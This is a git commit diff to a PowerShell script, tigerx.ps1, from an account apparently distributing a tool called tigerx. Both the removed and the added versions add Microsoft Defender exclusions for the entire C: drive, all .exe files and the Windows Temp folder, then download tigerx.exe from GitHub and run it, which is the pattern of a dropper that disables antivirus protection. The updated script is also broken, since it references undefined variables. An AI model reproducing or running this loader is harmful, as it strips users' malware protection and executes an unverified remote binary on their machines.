e21456c5f2fdf37e93ba312808e9b9b37ffb7102
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-04 00:00:47 +0200

    Update tigerx.ps1

--- tigerx.ps1
+++ tigerx.ps1
@@ -1,27 +1,9 @@
-Add-MpPreference -ExclusionPath "C:\",".exe","C:\Windows\Temp\"
-$ErrorActionPreference = "Stop"
-# Enable TLSv1.2 for compatibility with older clients
-[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
-
-$DownloadURL = 'https://github.com/Pctoolsbox/tigerx/raw/refs/heads/main/tigerx.exe'
-
 $rand = Get-Random -Maximum 99999999
-$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\tigerx_$rand.exe" } else { "$env:TEMP\tigerx_$rand.exe" }
-
-try {
-    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
-}
-catch {
-    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
-}
-
-$ScriptArgs = "$args "
-$prefix = "@REM $rand `r`n"
-$content = $prefix + $response
-Set-Content -Path $FilePath -Value $content
-
-Start-Process $FilePath $ScriptArgs -Wait
-
-$FilePaths = @("$env:TEMP\tigerx*.exe", "$env:SystemRoot\Temp\tigerx*.exe")
-foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+Add-MpPreference -ExclusionPath "C:\",".exe","C:\Windows\Temp\"
+$url = "https://github.com/Pctoolsbox/tigerx/raw/refs/heads/main/tigerx.exe"
+$outpath = "C:\Windows\Temp\tigerx_$rand.exe"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath)
+$args = @("Comma","Separated","Arguments")
+Start-Process $FilePath -ArgumentList $args
